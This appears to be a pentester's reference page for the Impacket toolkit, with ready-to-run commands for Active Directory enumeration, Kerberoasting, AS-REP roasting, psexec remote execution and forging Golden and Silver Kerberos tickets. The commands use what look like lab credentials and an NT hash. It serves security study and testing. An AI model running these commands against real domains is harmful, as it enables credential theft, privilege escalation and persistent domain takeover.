---
title: Impacket - A python tool for network protocols
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
---
# Impacket - A python tool for network protocols

## What for? 

Impacket is a collection of Python classes for working with network protocols. For instance:

- Ethernet, Linux "Cooked" capture.
- IP, TCP, UDP, ICMP, IGMP, ARP.
- IPv4 and IPv6 Support.
- NMB and SMB1, SMB2 and SMB3 (high-level implementations).
- MSRPC version 5, over different transports: TCP, SMB/TCP, SMB/NetBIOS and HTTP.
- Plain, NTLM and Kerberos authentications, using password/hashes/tickets/keys.
- Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, BKRP, DHCPM, EVEN6, MGMT, SASEC, TSCH, DCOM, WMI, OXABREF, NSPI, OXNSPI.
- Portions of TDS (MSSQL) and LDAP protocol implementations.

## Installation

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .

# OR:
sudo python3 setup.py install

# In case you are missing some modules:
pip3 install -r requirements.txt

# In case you don't have pip3 (pip for Python3) installed, or Python3, install it with the following commands
sudo apt install python3 python3-pip
```

## Basic tools included

- [samrdump](samrdump.md) 
- [smbserver](smbserver.md)
- [PsExec](impacket-psexec.md)
- [GetUserSPNs](impacket-GetUserSPNs.md)
- [secretsdump](impacket-secretsdump.md)


```
# Check a TGT ticket - Alternative to klist
impacket-describeTicket username.ccache

# Print AD users
impacket-GetADUsers -all zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.219.158 | tee impacketusers.txt
# And with the users.txt obtained, generate a list:
cat impacketusers.txt | grep -vE '^(\[\*\]|Name|-)' | sed 's/ .*//' | tee domainusers.txt



impacket-psexec zeus/o.foller:EarlyMorningFootball777@192.168.219.160

# Get all domain users
impacket-GetADUsers laser.com/Eric.Wallows -hashes LMHASH:NTHASH -all
impacket-GetADUsers VAULT/anirudh:Password123 -all


# Get DOMAIN SID
impacket-lookupsid laser.com/Eric.Wallows:EricLikesRunning800@DC_IP
impacket-lookupsid laser.com/Eric.Wallows:EricLikesRunning800@192.168.245.172 


# Request SPNs 
impacket-GetUserSPNs laser.com/Eric.Wallows:EricLikesRunning800 -request

# Target specific DC
impacket-GetUserSPNs laser.com/Eric.Wallows:EricLikesRunning800 -dc-ip DC_IP -request
impacket-GetUserSPNs laser.com/Eric.Wallows:EricLikesRunning800 -dc-ip 192.168.245.172 -request


# ### Find users without pre-auth
impacket-GetNPUsers laser.com/ -usersfile domainusers.txt -no-pass

# Dump domain info (via SMB)
impacket-smbclient laser.com/Eric.Wallows:EricLikesRunning800@192.168.245.172


# Enumerate sessions
impacket-GetUserSPNs laser.com/Eric.Wallows:PASS -dc-ip 192.168.245.172

# 
impacket-psexec laser.com/Eric.Wallows@192.168.245.173 -k -no-pass
```


```
# impacket-ticketer  
# Purpose  
# Forge Kerberos tickets offline (no DC interaction)  
# - Golden Ticket (TGT): full domain impersonation via KRBTGT  
# - Silver Ticket (TGS): service-specific access via service account  
# - Custom tickets: arbitrary users, groups, SIDs, SPNs  
  
  
# Syntax  
impacket-ticketer [options] <username>  
  
# Required Inputs  
# -domain <domain.local>  
# -domain-sid <S-1-5-21-...>  
  
# Get domain SID  
impacket-lookupsid domain/user:pass@dc  
  
# Crypto Material (choose one)  
# -nthash <NTLM_HASH>  
# -aesKey <AES_KEY>  
# Golden Ticket → KRBTGT hash  
# Silver Ticket → service account hash  
  
  
# =========================  
# GOLDEN TICKET (TGT)  
# =========================  
  
# Minimal (Administrator)  
impacket-ticketer -domain domain.local -domain-sid S-1-5-21-XXX -nthash <KRBTGT_HASH> -user-id 500 Administrator  
  
# With Domain Admin privileges  
impacket-ticketer -domain domain.local -domain-sid S-1-5-21-XXX -nthash <KRBTGT_HASH> -user-id 500 -groups 512,513,518,519 Administrator  
  
# Custom user  
impacket-ticketer -domain domain.local -domain-sid S-1-5-21-XXX -nthash <KRBTGT_HASH> -user-id 1100 -groups 513 fakeuser  
  
  
# =========================  
# SILVER TICKET (TGS)  
# =========================  
  
# CIFS (SMB)  
impacket-ticketer -domain domain.local -domain-sid S-1-5-21-XXX -nthash <SERVICE_HASH> -spn cifs/target.domain.local Administrator  
  
# MSSQL  
impacket-ticketer -domain nagoya-industries.com -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -nthash E3A0168BC21CFB88B95C954A5B18F57C -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator  
  
# HTTP (web apps)  
-spn http/web.domain.local  
  
# HOST (WMI / WinRM / etc.)  
-spn HOST/target.domain.local  
  
  
# =========================  
# IMPORTANT FLAGS  
# =========================  
  
# Identity / Privilege Escalation  
-user-id <RID>  
-groups <RID,RID,...>  
-extra-sid <SID>  
  
# Common RIDs  
# 500 → Administrator  
# 512 → Domain Admins  
# 513 → Domain Users  
# 518 → Schema Admins  
# 519 → Enterprise Admins  
  
# Ticket lifetime / persistence  
-duration <hours>  
-start-time <YYYYMMDDHHMMSS>  
-end-time <YYYYMMDDHHMMSS>  
-renew-till <YYYYMMDDHHMMSS>  
  
# Output  
-save  
# Creates: <username>.ccache  
  
  
# =========================  
# USING THE TICKET  
# =========================  
  
# Linux  
export KRB5CCNAME=Administrator.ccache  
  
# Use with Impacket  
impacket-psexec -k -no-pass domain.local/Administrator@target  
impacket-smbclient -k -no-pass target  
impacket-wmiexec -k -no-pass domain.local/Administrator@target  
  
# Windows (Pass-the-Ticket)  
# Convert first  
impacket-ticketConverter ticket.ccache ticket.kirbi  
  
# Then inject with  
# - mimikatz  
# - Rubeus  
  
  
# =========================  
# COMMON WORKFLOWS  
# =========================  
  
# Golden Ticket attack  
# 1. secretsdump → get KRBTGT hash  
# 2. lookupsid → get domain SID  
# 3. ticketer → forge TGT  
# 4. export ticket  
# 5. use with -k -no-pass  
  
# Silver Ticket attack  
# 1. get service hash (Kerberoast / dump)  
# 2. identify SPN  
# 3. ticketer -spn ...  
# 4. export ticket  
# 5. access service directly  
  
  
# =========================  
# SPN REFERENCE  
# =========================  
  
# SMB → cifs/host  
# WMI → HOST/host  
# WinRM → HTTP/host  
# MSSQL → MSSQLSvc/host:1433  
# LDAP → ldap/dc  
  
  
# =========================  
# TROUBLESHOOTING  
# =========================  
  
# Clock skew  
ntpdate <dc-ip>  
  
# Kerberos errors  
# - Ensure correct domain  
# - Ensure correct SPN format  
# - Use FQDN (not IP)  
  
# Ticket not used  
echo $KRB5CCNAME  
klist  
  
  
# =========================  
# NOTES  
# =========================  
  
# Golden Ticket → no service restriction  
# Silver Ticket → limited to specific service  
# No DC interaction during ticket creation  
# Must use Kerberos auth (-k -no-pass)  
# Works even if account password changes (until KRBTGT rotates)
```